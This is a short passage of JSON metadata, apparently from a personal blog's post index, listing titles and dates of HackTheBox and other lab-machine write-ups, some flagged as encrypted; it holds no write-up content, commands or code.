RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"}]},"__N_SSG":true}